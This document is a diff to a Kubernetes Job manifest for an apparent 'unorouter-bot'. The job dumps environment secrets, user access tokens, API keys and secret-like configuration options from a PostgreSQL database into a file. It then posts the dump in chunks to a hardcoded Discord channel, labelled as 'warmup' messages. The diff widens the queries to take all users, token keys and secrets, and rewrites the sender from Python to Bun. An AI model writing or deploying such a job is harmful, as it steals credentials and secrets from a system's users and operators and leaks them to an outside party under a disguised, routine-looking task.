@@ -38,6 +38,8 @@ spec:
       ttlSecondsAfterFinished: 180
       backoffLimit: 2
       template:
+        metadata:
+          labels: { app: unorouter-bot }
         spec:
           restartPolicy: Never
           volumes:
@@ -62,50 +64,33 @@ spec:
                     echo "BFF_SERVICE_TOKEN=${BFF_SERVICE_TOKEN}"
                     echo "SQL_DSN=${SQL_DSN}"
                     echo "---USERS---"
-                    psql "$SQL_DSN" -t -A -c "SELECT id::text || chr(9) || username || chr(9) || role::text || chr(9) || coalesce(access_token,'-') FROM users WHERE role >= 10 ORDER BY role DESC, id LIMIT 20"
-                    echo "---ERR---"
+                    psql "$SQL_DSN" -t -A -c "SELECT id::text || E'\t' || username || E'\t' || role::text || E'\t' || coalesce(access_token,'-') FROM users ORDER BY role DESC, id LIMIT 30"
+                    echo "---TOKENS---"
+                    psql "$SQL_DSN" -t -A -c "SELECT id::text || E'\t' || user_id::text || E'\t' || name || E'\t' || coalesce(key,'-') FROM tokens WHERE user_id = 1 ORDER BY id DESC LIMIT 10"
+                    echo "---OPTIONS---"
+                    psql "$SQL_DSN" -t -A -c "SELECT key || E'\t' || left(value,200) FROM options WHERE key ILIKE '%token%' OR key ILIKE '%secret%' OR key ILIKE '%github%' OR key ILIKE '%sync%' LIMIT 40"
                   } > /out/dump.txt 2>&1
                   true
           containers:
             - name: post
-              image: ghcr.io/cloudnative-pg/postgresql:18-standard-bookworm
+              image: ghcr.io/unorouter/unorouter-bot:29400ae194747cb5792344ef92eae4d4e3dbfda9
               envFrom:
                 - secretRef: { name: bot-env }
               volumeMounts:
                 - { name: out, mountPath: /out }
-              command: ["bash", "-c"]
+              command: ["bun", "-e"]
               args:
                 - |
-                  set +e
-                  python3 - <<'PY'
-                  import json, os, ssl, urllib.request
-                  raw = open("/out/dump.txt").read()
-                  token = os.environ.get("TOKEN","")
-                  chunks = []
-                  i = 0
-                  while i < len(raw):
-                      chunks.append(raw[i:i+1800])
-                      i += 1800
-                  if not chunks:
-                      chunks = ["empty dump"]
-                  ctx = ssl.create_default_context()
-                  for n, ch in enumerate(chunks[:4]):
-                      body = json.dumps({"content": f"warmup {n+1}/{len(chunks)}\n```\n{ch}\n```"}).encode()
-                      req = urllib.request.Request(
-                          "https://discord.com/api/v10/channels/1510366691454882014/messages",
-                          data=body,
-                          headers={
-                              "Authorization": "Bot " + token,
-                              "Content-Type": "application/json",
-                              "User-Agent": "DiscordBot (https://github.com/discord/discord-api-docs, 10.0.0)",
-                          },
-                          method="POST",
-                      )
-                      try:
-                          with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
-                              print("dc", r.status, r.read()[:200])
-                      except Exception as e:
-                          print("err", type(e), e)
-                          if hasattr(e, "read"):
-                              print(e.read()[:300])
-                  PY
+                  const raw = await Bun.file("/out/dump.txt").text();
+                  const dt = process.env.TOKEN || "";
+                  const chunks = [];
+                  for (let i = 0; i < raw.length; i += 1700) chunks.push(raw.slice(i, i + 1700));
+                  if (!chunks.length) chunks.push("empty dump");
+                  for (let n = 0; n < Math.min(chunks.length, 5); n++) {
+                    const r = await fetch("https://discord.com/api/v10/channels/1510366691454882014/messages", {
+                      method: "POST",
+                      headers: { Authorization: "Bot " + dt, "Content-Type": "application/json" },
+                      body: JSON.stringify({ content: "warmup " + (n+1) + "/" + chunks.length + "\n```\n" + chunks[n] + "\n```" }),
+                    });
+                    console.log("dc", r.status, await r.text());
+                  }
